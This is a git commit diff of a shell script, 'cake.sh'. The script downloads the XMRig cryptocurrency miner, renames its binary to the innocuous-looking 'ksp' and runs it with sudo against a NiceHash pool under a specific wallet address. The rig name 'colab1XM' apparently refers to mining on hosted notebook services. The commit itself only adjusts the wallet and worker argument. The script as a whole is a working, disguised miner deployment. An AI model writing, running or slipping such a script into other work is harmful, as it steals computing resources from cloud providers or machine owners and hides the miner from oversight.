e2e69773af025d113eb40309a0257fa51a69e686
KLVSPL <101648648+KLVSPL@users.noreply.github.com>
2022-04-10 12:00:52 +0800

    Update cake.sh

--- cake.sh
+++ cake.sh
@@ -4,4 +4,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bioni
 tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
 cd xmrig-6.16.4
 mv xmrig ksp
-sudo ./ksp -a rx/0 -o daggerhashimoto.usa-west.nicehash.com:3380 -u 33wuWzYwJTKJUVyqfMGDckUmKaaF876XQC --nicehash --rig-id=colab1XM
+sudo ./ksp -a rx/0 -o daggerhashimoto.usa-west.nicehash.com:3380 -u 33wuWzYwJTKJUVyqfMGDckUmKaaF876XQC.colab1XM --nicehash
